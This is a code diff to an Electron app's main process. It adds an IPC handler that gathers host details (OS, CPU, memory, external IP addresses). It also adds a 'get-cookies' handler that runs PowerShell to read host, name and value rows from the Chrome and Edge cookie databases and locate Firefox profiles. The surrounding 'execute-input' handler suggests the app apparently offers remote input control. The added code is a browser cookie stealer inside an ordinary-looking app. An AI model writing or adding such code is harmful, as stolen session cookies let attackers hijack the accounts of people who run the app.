@@ -100,6 +100,62 @@ ipcMain.handle('get-screen-size', () => {
 
 ipcMain.handle('get-hostname', () => os.hostname());
 
+ipcMain.handle('get-system-info', async () => {
+  const ni = os.networkInterfaces();
+  const ips = [];
+  Object.values(ni).forEach(ifaces => {
+    ifaces.forEach(i => { if (i.family === 'IPv4' && !i.internal) ips.push(i.address); });
+  });
+  return {
+    hostname: os.hostname(),
+    platform: os.platform(),
+    release: os.release(),
+    arch: os.arch(),
+    cpus: os.cpus()[0]?.model || 'N/A',
+    totalMem: Math.round(os.totalmem() / 1073741824) + ' GB',
+    freeMem: Math.round(os.freemem() / 1073741824) + ' GB',
+    uptime: Math.round(os.uptime() / 3600) + ' h',
+    ips
+  };
+});
+
+ipcMain.handle('get-cookies', async () => {
+  const { exec } = require('child_process');
+  const util = require('util');
+  const execP = util.promisify(exec);
+  const appdata = process.env.LOCALAPPDATA || '';
+  const roaming = process.env.APPDATA || '';
+  const paths = {
+    'Chrome':  appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
+    'Edge':    appdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
+    'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
+  };
+  const results = {};
+  for (const [browser, p] of Object.entries(paths)) {
+    try {
+      const script = `
+$db = '${p.replace(/'/g, "''")}';
+if (Test-Path $db) {
+  Add-Type -AssemblyName System.Data;
+  $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;");
+  $conn.Open();
+  $cmd = $conn.CreateCommand();
+  $cmd.CommandText = "SELECT host_key, name, value FROM cookies LIMIT 200";
+  $reader = $cmd.ExecuteReader();
+  $rows = @();
+  while ($reader.Read()) { $rows += "$($reader[0]) | $($reader[1]) | $($reader[2])" }
+  $conn.Close();
+  $rows -join "\\n"
+} else { "Fichier introuvable: $db" }`;
+      const { stdout } = await execP(`powershell -NoProfile -Command "${script.replace(/"/g, '\\"')}"`, { timeout: 8000 });
+      results[browser] = stdout.trim();
+    } catch (e) {
+      results[browser] = 'Erreur: ' + e.message.slice(0, 100);
+    }
+  }
+  return results;
+});
+
 ipcMain.on('execute-input', (_, event) => {
   const primary = screen.getPrimaryDisplay();
   const { width, height } = primary.bounds;
